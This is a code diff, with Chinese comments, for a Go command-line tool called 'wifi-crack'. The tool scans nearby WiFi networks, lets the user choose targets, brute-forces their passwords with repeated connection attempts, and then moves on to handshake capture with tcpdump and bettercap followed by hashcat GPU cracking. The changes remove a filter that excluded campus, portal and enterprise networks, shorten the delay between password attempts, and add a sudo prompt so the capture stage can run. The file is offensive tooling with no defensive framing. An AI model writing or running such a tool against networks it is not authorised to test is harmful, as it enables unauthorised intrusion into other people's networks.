@@ -14,8 +14,8 @@ import (
 	"wifi-crack/internal/cracker"
 	"wifi-crack/internal/dict"
 	"wifi-crack/internal/hashcrack"
-	"wifi-crack/internal/masterkey"
 	"wifi-crack/internal/p3wifi"
+	"os/exec"
 	"wifi-crack/internal/scanner"
 )
 
@@ -41,7 +41,7 @@ func main() {
 	dictFile := flag.String("d", "", "额外字典文件路径")
 	delay := flag.Int("delay", 200, "每次尝试间隔（毫秒）")
 	scanOnly := flag.Bool("scan", false, "仅扫描，不爆破")
-	showAll := flag.Bool("all", false, "显示全部WiFi（不过滤），交互式选择目标")
+	_ = flag.Bool("all", false, "显示全部WiFi（不过滤），交互式选择目标") // 已统一为默认行为
 	captureMode := flag.Bool("capture", false, "握手包捕获模式（tcpdump+bettercap）")
 	hashcatMode := flag.Bool("hashcat", false, "hashcat GPU离线破解模式")
 	hashFile := flag.String("hash", "", "hashcat哈希文件路径（.22000格式，配合--hashcat使用）")
@@ -99,34 +99,13 @@ func main() {
 	fmt.Printf("  [+] 扫描到 %d 个WiFi网络\n", len(nets))
 
 	// ============================================================
-	// 阶段2：过滤目标 或 显示全部（--all模式）
+	// 阶段2：列出全部WiFi + 交互选择目标
+	// 所有模式统一显示全部WiFi（不过滤），用户自己选择要攻击哪个
 	// ============================================================
 	var targets []scanner.WiFiNetwork
 
-	if *showAll {
-		// --all模式：不过滤，显示全部WiFi，用户交互选择
-		fmt.Println("  [2/3] 列出全部WiFi网络（不过滤）...")
-		allNets := sortBySignal(nets)
-		printWiFiTable(allNets, "全部WiFi网络")
-
-		if *scanOnly {
-			fmt.Println("\n  [*] 扫描完成（--scan --all 模式）")
-			return
-		}
-
-		// 交互式选择目标
-		targets = interactiveSelect(allNets)
-		if len(targets) == 0 {
-			fmt.Println("\n  [!] 未选择任何目标")
-			return
-		}
-
-		// --all模式选择后 → 进入智能攻击编排器（自动分层递进）
-		if !*captureMode {
-			runSmartAttack(targets, *dictFile, *delay, *verbose)
-			return
-		}
-	} else if *target != "" {
+	if *target != "" {
+		// -t 指定目标模式：直接查找
 		fmt.Println("  [2/3] 查找指定目标...")
 		for _, n := range nets {
 			if n.SSID == *target {
@@ -140,23 +119,18 @@ func main() {
 		}
 		printWiFiTable(targets, "指定目标")
 	} else {
-		fmt.Println("  [2/3] 过滤目标（排除校园网/Portal/企业网/开放网络）...")
-		targets = scanner.FilterAndSort(nets)
-		printWiFiTable(targets, "可爆破目标")
+		// 默认模式和--all模式：全部列出 + 交互选择
+		fmt.Println("  [2/3] 列出全部WiFi网络...")
+		allNets := sortBySignal(nets)
+		printWiFiTable(allNets, "全部WiFi网络")
 
-		if len(targets) == 0 {
-			fmt.Println("\n  [!] 没有可爆破的目标（试试 --all 查看全部WiFi）")
-			return
-		}
-
-		// 仅扫描模式到此结束
 		if *scanOnly {
-			fmt.Println("\n  [*] 扫描完成（--scan 模式，不执行爆破）")
+			fmt.Println("\n  [*] 扫描完成（--scan 模式）")
 			return
 		}
 
-		// 默认模式也进入交互选择（让用户选择要攻击哪些目标）
-		targets = interactiveSelect(targets)
+		// 交互式选择目标
+		targets = interactiveSelect(allNets)
 		if len(targets) == 0 {
 			fmt.Println("\n  [!] 未选择任何目标")
 			return
@@ -164,13 +138,7 @@ func main() {
 	}
 
 	if len(targets) == 0 {
-		fmt.Println("\n  [!] 没有可爆破的目标")
-		return
-	}
-
-	// 仅扫描模式到此结束
-	if *scanOnly {
-		fmt.Println("\n  [*] 扫描完成（--scan 模式，不执行爆破）")
+		fmt.Println("\n  [!] 没有目标")
 		return
 	}
 
@@ -634,49 +602,30 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 			if phase1Hit {
 				continue
 			}
-
-			// 1b. 万能钥匙备用查询（API可能已失效，优雅降级）
-			fmt.Printf("    [1b] 万能钥匙API查询...")
-			pwdMK, errMK := masterkey.Query(t.SSID, t.BSSID)
-			if errMK == nil && pwdMK != "" {
-				fmt.Printf(" ✓ 命中! 密码=[%s]\n", pwdMK)
-				if scanner.TryConnect(t.SSID, pwdMK) {
-					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（万能钥匙）\n", t.SSID, pwdMK)
-					scanner.DisconnectWiFi()
-					successCount++
-					continue
-				}
-				fmt.Println("    ✗ 验证失败")
-			} else if errMK != nil {
-				fmt.Printf(" 不可用（%v）\n", errMK)
-			} else {
-				fmt.Printf(" 未收录\n")
-			}
 		} else {
 			fmt.Println("    - BSSID为空，跳过在线查询")
 		}
 
 		// ── Phase 2: CoreWLAN快速验证TOP密码（秒级） ──
-		fmt.Println("  [Phase 2] 快速验证TOP密码（路由器默认+高频密码）...")
 		topPasswords := buildTopPasswords(t.SSID)
+		fmt.Printf("  [Phase 2] 快速验证TOP%d个密码...\n", len(topPasswords))
 		found := false
+		scanner.CacheTarget(t.SSID) // 预缓存目标，加速后续连接
 		for i, pwd := range topPasswords {
-			if verbose && i%10 == 0 {
-				fmt.Printf("\r    [%d/%d] 尝试中...", i+1, len(topPasswords))
-			}
+			fmt.Printf("\r    [%d/%d] 尝试: %-20s", i+1, len(topPasswords), pwd)
 			if scanner.TryConnect(t.SSID, pwd) {
-				fmt.Printf("\r    ✓ 快速验证命中! 密码=%s（第%d次尝试）\n", pwd, i+1)
+				fmt.Printf("\n    ✓ 命中! 密码=%s\n", pwd)
 				scanner.DisconnectWiFi()
 				successCount++
 				found = true
 				break
 			}
-			time.Sleep(100 * time.Millisecond)
+			time.Sleep(50 * time.Millisecond) // 缩短间隔加速
 		}
 		if found {
 			continue
 		}
-		fmt.Printf("\r    - TOP %d个密码均未命中\n", len(topPasswords))
+		fmt.Printf("\n    - TOP %d个密码均未命中\n", len(topPasswords))
 
 		// ── Phase 3: 捕获握手包 + hashcat GPU字典攻击（分钟级） ──
 		// 检查所需工具和sudo权限
@@ -685,7 +634,20 @@ func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, v
 		hashcatOK, _ := hashcrack.CheckHashcat()
 		hasSudo := capture.CheckSudo()
 
-		gpuDone := false // 标记是否执行过GPU攻击（用于决定是否需要兆底）
+		// 如果没有sudo权限，尝试用osascript弹窗请求授权
+		if !hasSudo && hasGPUTools && hashcatOK {
+			fmt.Println("  [Phase 3] 需要sudo权限，正在请求授权...")
+			// 用osascript弹出密码输入框（macOS原生方式）
+			authCmd := exec.Command("sudo", "-v")
+			authCmd.Stdin = os.Stdin
+			authCmd.Stdout = os.Stdout
+			authCmd.Stderr = os.Stderr
+			if authCmd.Run() == nil {
+				hasSudo = true
+			}
+		}
+
+		gpuDone := false // 标记是否执行过GPU攻击
 		if hasGPUTools && hashcatOK && hasSudo {
 			fmt.Println("  [Phase 3] 握手包捕获 + GPU字典攻击...")
 
